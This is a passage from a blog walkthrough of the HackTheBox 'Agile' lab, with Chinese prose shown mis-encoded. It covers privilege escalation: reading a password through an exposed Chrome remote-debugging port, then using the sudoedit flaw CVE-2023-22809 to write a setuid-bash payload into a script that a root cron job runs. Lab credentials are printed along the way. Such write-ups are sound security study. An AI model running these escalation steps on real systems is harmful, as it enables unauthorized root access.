<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:~$ sudo -l</span><br><span class="line">[sudo] password for corum: </span><br><span class="line">Sorry, user corum may not run sudo on agile.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Chromeè°ƒè¯•"><a href="#Chromeè°ƒè¯•" class="headerlink" title="Chromeè°ƒè¯•"></a>Chromeè°ƒè¯•</h2><p>ä»<code>/etc/hosts</code>å‘ç°å­åŸŸåâ€test.superpass.htbâ€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:~$ cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost superpass.htb test.superpass.htb</span><br><span class="line">127.0.1.1 agile</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å­åŸŸåçš„nginxé…ç½®æ–‡ä»¶ï¼›å®ƒä»…åœ¨æœ¬åœ°ä¸»æœºä¸Šä¾¦å¬ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹ä»£ç†åˆ°æœ¬åœ°ä¸»æœº 5555ã€‚</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:/etc/nginx/sites-available$ cat /etc/nginx/sites-available/superpass-test.nginx </span><br><span class="line">server &#123;</span><br><span class="line">    listen 127.0.0.1:80<span class="comment">;</span></span><br><span class="line">    server_name test.superpass.htb<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/app-testing/superpass/static<span class="comment">;</span></span><br><span class="line">        expires 365d<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params<span class="comment">;</span></span><br><span class="line">        proxy_pass http://127.0.0.1:5555<span class="comment">;</span></span><br><span class="line">        proxy_set_header Host $host<span class="comment">;</span></span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr<span class="comment">;</span></span><br><span class="line">        proxy_set_header X-Forwarded-Protocol $scheme<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡sshæœ¬åœ°ç«¯å£è½¬å‘åˆ°kaliæœºä¸Šï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 5555:localhost:5555 corum@superpass.htb</span><br></pre></td></tr></table></figure>

<p>è€Œç„¶ï¼Œè¿™å¹¶æ²¡æœ‰å¸®åŠ©ï¼›</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125211630.png"></p>
<p>åœ¨<code>/tests/functional/test_site_interactively.py</code>æ–‡ä»¶å‘ç°åœ¨åŠ¨æ€è°ƒè¯•<code>selenium</code>ï¼›ä¹‹å‰pythonçˆ¬è™«ç”¨è¿‡<code>selenium</code>;</p>
<p><em>Seleniumæ˜¯</em>ä¸€ä¸ªç”¨äºWebåº”ç”¨ç¨‹åºæµ‹è¯•çš„å·¥å…·ã€‚Seleniumæµ‹è¯•ç›´æ¥è¿è¡Œåœ¨æµè§ˆå™¨ä¸­ï¼Œå°±åƒçœŸæ­£çš„ç”¨æˆ·åœ¨æ“ä½œä¸€æ ·ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:/app/app-testing$ cat ./tests/functional/test_site_interactively.py                                     </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/app-testing/tests/functional/creds.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    username, password = f.read().strip().split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">@pytest.fixture(<span class="params">scope=<span class="string">&quot;session&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">driver</span>():</span><br><span class="line">    options = Options()</span><br><span class="line">    <span class="comment">#options.add_argument(&quot;--no-sandbox&quot;)</span></span><br><span class="line">    options.add_argument(<span class="string">&quot;--window-size=1420,1080&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--remote-debugging-port=41829&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--crash-dumps-dir=/tmp&#x27;</span>)</span><br><span class="line">    driver = webdriver.Chrome(options=options)</span><br><span class="line">    <span class="keyword">yield</span> driver</span><br><span class="line">    driver.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_login</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_login&quot;</span>)</span><br><span class="line">    driver.get(<span class="string">&#x27;http://test.superpass.htb/account/login&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    username_input = driver.find_element(By.NAME, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">    username_input.send_keys(username)</span><br><span class="line">    password_input = driver.find_element(By.NAME, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">    password_input.send_keys(password)</span><br><span class="line">    driver.find_element(By.NAME, <span class="string">&quot;submit&quot;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    title = driver.find_element(By.TAG_NAME, <span class="string">&quot;h1&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> title.text == <span class="string">&quot;Welcome to your vault&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_add_password</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_add_password&quot;</span>)</span><br><span class="line">    driver.find_element(By.NAME, <span class="string">&quot;add_password&quot;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    site = driver.find_element(By.NAME, <span class="string">&quot;url&quot;</span>)</span><br><span class="line">    site.send_keys(<span class="string">&quot;test_site&quot;</span>)</span><br><span class="line">    username = driver.find_element(By.NAME, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">    username.send_keys(<span class="string">&quot;test_user&quot;</span>)</span><br><span class="line">    driver.find_element(By.CLASS_NAME, <span class="string">&quot;fa-save&quot;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_site&#x27;</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_user&#x27;</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_del_password</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_del_password&quot;</span>)</span><br><span class="line">    password_rows = driver.find_elements(By.CLASS_NAME, <span class="string">&quot;password-row&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> password_rows:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;test_site&quot;</span> == row.find_elements(By.TAG_NAME, <span class="string">&quot;td&quot;</span>)[<span class="number">1</span>].text <span class="keyword">and</span> \</span><br><span class="line">            <span class="string">&quot;test_user&quot;</span> == row.find_elements(By.TAG_NAME, <span class="string">&quot;td&quot;</span>)[<span class="number">2</span>].text:</span><br><span class="line">            row.find_element(By.CLASS_NAME, <span class="string">&quot;fa-trash&quot;</span>).click()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_site&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_title</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_title&quot;</span>)</span><br><span class="line">    driver.get(<span class="string">&#x27;http://test.superpass.htb&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;SuperPassword ğŸ¦¸&quot;</span> == driver.title</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_long_running</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_long_running&quot;</span>)</span><br><span class="line">    driver.get(<span class="string">&#x27;http://test.superpass.htb&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">550</span>)</span><br><span class="line">    <span class="comment">#time.sleep(5)</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;SuperPasword ğŸ¦¸&quot;</span> == driver.title</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»æ–‡ä»¶ä¸­å‘ç°â€â€“remote-debugging-port&#x3D;41829â€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:/app/app-testing$ netstat -ltun|grep 41829</span><br><span class="line">tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN     </span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°ç«¯å£è½¬å‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 41829:localhost:41829 corum@superpass.htb</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€ Chromium å¹¶<code>chrome://inspect</code>è½¬åˆ°è®¾å¤‡é¡µé¢</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125213407.png"></p>
<p>å•å‡»â€œdoneâ€ä¼šæ˜¾ç¤ºä¸€ä¸ªæ–°çš„è¿œç¨‹ç›®æ ‡ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125213433.png"></p>
<p>å•å‡»â€œinspectâ€ä¼šå¼¹å‡ºä¸€ä¸ªè¿æ¥åˆ°æµ‹è¯• selenium çš„å¼€å‘å·¥å…·å®ä¾‹ï¼š</p>
<p>ä»ä¸­å¯ä»¥å‘ç°â€edwardsâ€ç”¨æˆ·çš„å¯†ç ï¼šâ€d07867c6267dcb5df0afâ€</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125213604.png"></p>
<h2 id="user-edwards"><a href="#user-edwards" class="headerlink" title="user-edwards"></a>user-edwards</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:~$ su edwards</span><br><span class="line">Password: d07867c6267dcb5df0af</span><br></pre></td></tr></table></figure>

<p>æƒé™æ£€æŸ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~$ sudo -l</span><br><span class="line">[sudo] password for edwards: </span><br><span class="line">Matching Defaults entries for edwards on agile:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User edwards may run the following commands on agile:</span><br><span class="line">    (dev_admin : dev_admin) sudoedit /app/config_test.json</span><br><span class="line">    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯ä»¥ç”¨<code>dev_admin</code>ç”¨æˆ·çš„<code>sudoedit</code>å‘½ä»¤ç¼–è¾‘ä¸¤ä¸ªæ–‡ä»¶ï¼›è¿™ä¸¤ä¸ªæ–‡ä»¶ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -u dev_admin sudoedit /app/config_test.json</span><br><span class="line">&#123;</span><br><span class="line">&quot;SQL_URI&quot;:</span><br><span class="line">&quot;mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt</span><br><span class="line">edwards:1d7ffjwrx#$d6qn!9nndqgde4</span><br></pre></td></tr></table></figure>



<p>sudoç‰ˆæœ¬ä»1.8.0åˆ°1.9.12p1ä¹‹é—´å­˜åœ¨<a target="_blank" rel="noopener" href="https://security-tracker.debian.org/tracker/CVE-2023-22809">CVE-2023-22809</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~$ sudo --version</span><br><span class="line">Sudo version 1.9.9</span><br><span class="line">Sudoers policy plugin version 1.9.9</span><br><span class="line">Sudoers file grammar version 48</span><br><span class="line">Sudoers I/O plugin version 1.9.9</span><br><span class="line">Sudoers audit plugin version 1.9.9</span><br></pre></td></tr></table></figure>

<p>æ­¤æ¼æ´å…è®¸ç”¨æˆ·åœ¨ç”¨æˆ·æä¾›çš„ç¯å¢ƒå˜é‡ä¸­æä¾›é¢å¤–çš„å‚æ•°ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è®¿é—®é…ç½®å…è®¸çš„å…¶ä»–æ–‡ä»¶ä»¥è¿›è¡Œå¤„ç†ã€‚æ­¤å¤„åº”ç”¨å…è®¸ edwards å°†ä»»ä½•æ–‡ä»¶å†™å…¥ dev_adminï¼Œè€Œä¸ä»…ä»…æ˜¯è¿™ä¸¤ä¸ªã€‚</p>
<p>æˆ‘ä»¬åªèƒ½ç¼–è¾‘ä»¥å‰ä½œä¸ºdev_adminæ‰¾åˆ°çš„æ–‡ä»¶ã€‚åœ¨&#x2F;appä¸­æ‰¾åˆ°çš„test_and_upgrade.sh bashè„šæœ¬æ˜¾ç¤ºäº†ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤ï¼Œç‰¹åˆ«<code>source /app/venv/bin/activate </code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:/app$ <span class="built_in">cat</span> test_and_update.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># update prod with latest from testing constantly assuming tests are passing</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Starting test_and_update&quot;</span></span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="comment"># if already running, exit</span></span><br><span class="line">ps auxww | grep -v <span class="string">&quot;grep&quot;</span> | grep -q <span class="string">&quot;pytest&quot;</span> &amp;&amp; <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Not already running. Starting...&quot;</span></span><br><span class="line"><span class="comment"># start in dev folder</span></span><br><span class="line"><span class="built_in">cd</span> /app/app-testing</span><br><span class="line"><span class="comment"># system-wide source doesn&#x27;t seem to happen in cron jobs</span></span><br><span class="line"><span class="built_in">source</span> /app/venv/bin/activate</span><br><span class="line"><span class="comment"># run tests, exit if failure</span></span><br><span class="line">pytest -x 2&gt;&amp;1 &gt;/dev/null || <span class="built_in">exit</span></span><br><span class="line"><span class="comment"># tests good, update prod (flask debug mode will load it instantly)</span></span><br><span class="line"><span class="built_in">cp</span> -r superpass /app/app/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Complete!&quot;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ–‡ä»¶ç”±æ ¹ç›®å½•æ‰€æœ‰ï¼Œç»„å½’dev_adminæ‰€æœ‰ï¼Œåè€…æ‹¥æœ‰ç¼–è¾‘è¯¥æ–‡ä»¶çš„æƒé™ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~$ ls -al /app/venv/bin/activate</span><br><span class="line">-rw-rw-r-- 1 root dev_admin 1976 Aug 5 17:03 /app/venv/bin/activate</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨<a target="_blank" rel="noopener" href="https://security-tracker.debian.org/tracker/CVE-2023-22809">CVE-2023-22809</a>å¾€<code>/app/venv/bin/activate</code>å†™æ¶æ„ä»£ç ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EDITOR=&#x27;vim -- /app/venv/bin/activate&#x27; sudoedit -u dev_admin /app/config_test.json</span><br></pre></td></tr></table></figure>

<p>æ¶æ„ä»£ç å¦‚ä¸‹ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/zixyd</span><br><span class="line">chmod 4777 /tmp/zixyd</span><br></pre></td></tr></table></figure>

<p>æœ€åç­‰å‡ åˆ†é’Ÿï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~<span class="comment"># ls -al /tmp/zixyd</span></span><br><span class="line">-rwsrwxrwx 1 root root 1396520 Jan 25 14:04 /tmp/zixyd</span><br><span class="line">edwards@agile:~<span class="comment"># /tmp/zixyd -p</span></span><br><span class="line">edwards@agile:~<span class="comment"># cd /root</span></span><br><span class="line">edwards@agile:/root<span class="comment"># </span></span><br></pre></td></tr></table></figure>

</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-25</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 3002 words, 10 min 0 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Agile(HTB)%0Ahttps://zIxyd.github.io/2024/01/25/Agile(HTB)/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/01/25/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="frp+proxifierå†…ç½‘ç©¿é€">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>